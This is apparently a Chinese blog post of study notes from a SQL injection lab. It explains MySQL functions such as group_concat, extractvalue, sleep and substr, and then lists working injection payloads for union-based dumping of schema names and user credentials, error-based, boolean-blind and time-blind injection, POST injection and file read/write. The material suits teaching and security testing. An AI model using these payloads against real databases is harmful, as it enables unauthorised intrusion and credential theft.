---
title: "sql常见函数及语句"
description: 这是sql注入中常用到的函数和语句集合
pubDate: 2026-11-15T16:45
tags: [sql注入, 数据库, sql]
emoji: "📝"
hue: 255
featured: true
draft: false
---
# SQL 常见函数及语句

> 内容来自 sqli_lab 工作区的 `le1.py` ~ `le15.py`。  
> 
> 格式：先一行说明函数作用，然后是函数原型，最后是参数说明。

## 一、函数

### database()

`database()`函数能够返回当前连接所在的数据库名

函数原型:

    DATABASE()



没有参数,
返回当前库的名字,比如 security,一次连接只连一个库,所以它只会返回这一个库名

### version()

`version()`函数能够返回 MySQL 的版本号

函数原型:

    VERSION()



没有参数,
返回一个字符串,比如 5.7.26,拿到版本号就知道有没有 information_schema、能不能用 extractvalue 和 SLEEP

### current_user()

`current_user()`函数能够返回当前登录的数据库账号

函数原型:

    CURRENT_USER()


没有参数,
返回 用户名@主机 的形式,比如 root@localhost,同一类的还有 USER()、SESSION_USER()

### concat()

`concat()`函数能够把多个字符串拼成一个

函数原型:

    CONCAT(str1, str2, ...)


str1、str2 是要拼的字符串,可以给多个,
只要有一个参数是 NULL,整个结果就是 NULL,  

*报错注入里的经典用法是 `CONCAT(0x7e, (SELECT database()))`,把 `~` 和数据拼成 `~security`*

### group_concat()

`group_concat()`函数能够把一组行的值拼成一行

函数原型:

    GROUP_CONCAT([DISTINCT] expr [, expr ...] [ORDER BY ...] [SEPARATOR str])


expr 是要拼的列或表达式,可以给多个,比如 `username, 0x3a, password`,
默认用逗号分隔,想换分隔符就写 `SEPARATOR`,0x3a 就是冒号,
返回值默认最多 1024 字节(group_concat_max_len),超了直接截断,所以表多了会看不全,
它在联合查询里特别省事:一行就能把所有表名、列名或账号密码全返回出来
```sql
SELECT group_concat(username) FROM security.users;
# Dumb,Angelina,Dummy,secure,stupid,superman,batman
# 默认逗号连接

SELECT group_concat(username SEPARATOR ' | ') FROM security.users;
# Dumb | Angelina | Dummy | secure | stupid | superman | batman
# SEPARATOR可以自定义用什么东西连接

SELECT group_concat(username, ':', password) FROM security.users;
# 拼多个列

SELECT group_concat(username ORDER BY username) FROM security.users;
# order by可以排序
```

### count()

`count()`函数能够数行数

函数原型:

    COUNT(*), 或 COUNT(expr)


`COUNT(*)` 数所有行,`COUNT(列名)` 只数这一列不为 NULL 的行,
时间盲注里用它先把“一共多少条”问出来,再决定要不要继续挖

### length()

`length()`函数能够返回字符串的字节长度

函数原型:

    LENGTH(str)

str 是要测的字符串,
返回的是字节数,不是字符数,**utf8 下一个汉字算 3 个字节**,
想按字符个数数就用 `CHAR_LENGTH(str)`,
盲注第一步就是猜它:`IF(LENGTH(database()) = 8, SLEEP(2), 0)`

### substr()

`substr()`函数能够截取字符出来

函数原型:

    SUBSTR(str, pos, len)


str 为要被截取的字符串,
pos 是起始位置,注意注意,与 python 不同,他的起始是从 1 算起的,pos = 1,起始字符为第一个字符,
pos 为负数,就是倒着截取,
len 是切的长度,省略就截到末尾,
`SUBSTRING()` 是同义词,写哪个都行

### ascii()

`ascii()`函数能够返回最左边一个字符的 ASCII 码

函数原型:

    ASCII(str)


str 是要取码的字符串,只取第一个字符,
空字符串返回 0,
**多字节字符(中文)只按第一个字节算**,所以二分中文要改用 HEX,
配合 SUBSTR 就能一个字符一个字符问:`ASCII(SUBSTR(database(), 1, 1))`

### if()

`if()`函数能够按条件二选一

函数原型:

    IF(expr1, expr2, expr3)


expr1 是条件,为真(非 0 且非 NULL)就返回 expr2,否则返回 expr3,
时间盲注的核心就是 `IF(LENGTH(database()) = 8, SLEEP(2), 0)`

### sleep()

`sleep()`函数能够让语句停一会儿

函数原型:

    SLEEP(seconds)


seconds 是**秒数**,可以带小数,比如 SLEEP(0.5),
正常睡完返回 0,被中断返回 1,
它是时间盲注的信号来源:条件真就睡,假就返回 0,拿响应耗时当 0 和 1

### ifnull()

`ifnull()`函数能够在为 NULL 时返回替代值

函数原型:

    IFNULL(expr1, expr2)


expr1 是原表达式,expr2 是它等于 NULL 时返回的值,
不是 NULL 就原样返回 expr1

### extractvalue()

`extractvalue()`函数能够按路径从 XML 里取值,也是常用的报错注入点

函数原型:

    EXTRACTVALUE(xml_doc, xpath)


xml_doc 是要解析的 XML 字符串,填 1 也行,
xpath 是取值路径,注意注意,要让它报错就故意写成不合法的(`~security`),并不是合法路径,
报错信息只显示路径的前 32 个字符,超了会被截断,所以大结果要 substr 分批,
第一个参数无关紧要,重点是第二个参数一定不能是合法路径,合法路径不报错就没有回显

### updatexml()

`updatexml()`函数能够替换 XML 里的节点,同样能拿来报错注入

函数原型:

    UPDATEXML(xml_doc, xpath, new_xml)


xml_doc 是要解析的 XML,填 1 也行,
xpath 是路径,同样填成不合法的(`~security`)让它报错,
new_xml 是要替换成的新内容,填 1 就行,反正报错发生在它生效之前

### hex()

`hex()`函数能够把字符串转成十六进制

函数原型:

    HEX(str)

str 是要转的字符串,
返回两位一组的十六进制串,中文这种多字节数据用它才不会被 `ASCII()` 截断,
`0x7e`(~)、`0x3a`(冒号)这种是十六进制字面量,不是函数,顺手记一下

## 二、语句

按执行顺序排:

**判闭合**

```sql
payload = "1'"
```

报错 `near ''1'' LIMIT 0,1'`,说明是单引号字符型

**试列数**(数字型)

```sql
payload = "-1' UNION SELECT 1,2,3 #"     -- 报错
payload = "-1 UNION SELECT 1,2,3 #"      -- 去掉引号才通
```

三个占位列说明表有三列

**查库名**

```sql
payload = "-1' UNION SELECT 1,database(),3 -- "
```

回显 `Your Login name:security<br>Your Password:3`

**查表名**

```sql
payload = "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' #"
```

回显 `emails,referers,uagents,users`

**查列名**

```sql
payload = "-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' AND table_schema='security' #"
```

回显 `id,username,password`

**查数据**

```sql
payload = "-1' UNION SELECT 1,group_concat(username, '|', password),3 FROM users #"
```

**查所有库**

```sql
payload = "-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys') #"
```

把 `tables` 换成 `schemata`、`table_name` 换成 `schema_name`,再加 `NOT IN` 排除四个系统库

**查所有表**

```sql
payload = "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') #"
```

**报错注入查库**

```sql
payload = "1' AND extractvalue(1, concat(0x7e, (SELECT database()))) # "
```

回显 `XPATH syntax error: '~security'`

**布尔盲注**

```sql
payload = f"1' AND length(database()) = {n} -- "
payload = f"1' AND substr(database(), {i}, 1) = '{j}' -- "
```

先猜长度(8 个字节),再一位一位猜字符

**时间盲注**

```sql
payload = "1' AND SLEEP(3) -- "
```

用响应耗时判断真假

**POST 注入**

```python
data = {
    "uname": "...",
    "passwd": "111",
    "submit": "Submit"
}
res = requests.post(url, data=data)
```
这里data里面要填的东西可以先去浏览器的f12网络那一栏找

## 三、补充:常见函数 / 语句

### 取信息类

- `user()` 当前客户端用户,`system_user()` 系统用户  

- `schema()` 同 `database()`
- `@@version`、`@@datadir`、`@@basedir`、`@@hostname`、`@@secure_file_priv`:系统变量(不是函数,用 `@@` 取)
- `char(65)` 把数字转成字符,`ord('A')` 反过来
- `mid(str,pos,len)`、`left(str,n)`、`right(str,n)`:另外几种截取
- `substring_index(str,'.',1)`:按分隔符切,取 IP、域名常用
- `concat_ws('-',a,b)`:带分隔符拼接
- `group_concat(... SEPARATOR 0x3a)`:拼成 `a:b`
- `hex()` / `unhex()`:十六进制互转,绕引号、处理中文常用
- `replace()`、`reverse()`、`lcase()`、`ucase()`
- `md5()`、`sha1()`:算哈希,盲注里先算好再逐位比
- `coalesce(a,b,c)`、`nullif(a,b)`、`case when ... then ... end`:空值和条件表达式

### 报错注入类

- `extractvalue()`、`updatexml()`:你已经用过
- `floor(rand()*2)` 配 `group by` + `count(*)`:经典的 rand 报错
- `elt(n, ...)`、`make_set()`:配合报错函数用
- `geometrycollection()`:MySQL 5.7 上也能报错

### 时间盲注类

- `sleep(n)`:你已经用过
- `benchmark(n, expr)`:把 expr 执行 n 次,次数大了一样能拖时间
- `if(cond, sleep(n), 0)`:你文件里已经有了

### 读写文件类

- `load_file('C:/...')`:读文件,需要 FILE 权限且 `secure_file_priv` 允许
- `select ... into outfile '路径'`、`into dumpfile`:写文件

### 结构 / 语法类

- `union select` / `union all`:合并结果集,列数要一致
- `order by n`:按第 n 列排序,常用来试列数(比 `union select 1,2,3` 更隐蔽)
- `limit m,n` / `limit n offset m`:取第几行
- `information_schema.schemata` / `.tables` / `.columns` / `.statistics` / `.processlist`:元数据
- `show databases` / `show tables` / `show columns from 表`:直查,但一般要堆叠注入或已有权限
- `select ... into @变量`:把结果存变量,不返回结果集




